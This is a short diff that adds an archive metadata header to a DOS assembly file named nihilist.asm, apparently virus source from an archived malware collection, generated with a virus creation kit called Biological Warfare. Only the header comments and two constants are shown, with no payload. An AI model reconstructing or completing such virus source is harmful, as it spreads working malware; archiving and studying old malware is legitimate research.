@@ -1,5 +1,16 @@
+; ------------------------------------------------------------
+; name      N
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; nihilist.asm : [Nihilist]
-; Created with Biological Warfare - Version 0.90� by MnemoniX
+; Created with Biological Warfare - Version 0.90� by MnemoniX
 
 PING            equ     0D86Bh
 PONG            equ     043C4h
